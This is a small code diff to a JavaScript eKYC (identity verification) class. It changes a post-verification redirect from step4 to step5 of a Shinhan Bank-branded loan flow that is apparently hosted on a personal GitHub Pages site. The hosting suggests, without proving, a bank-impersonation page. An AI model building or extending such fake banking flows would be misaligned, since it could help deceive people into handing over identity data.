@@ -793,7 +793,7 @@ class EKYCApp {
         
         // Redirect to success page after 2 seconds
         setTimeout(() => {
-            window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step4.html';
+            window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step5.html';
         }, 2000);
     }
 
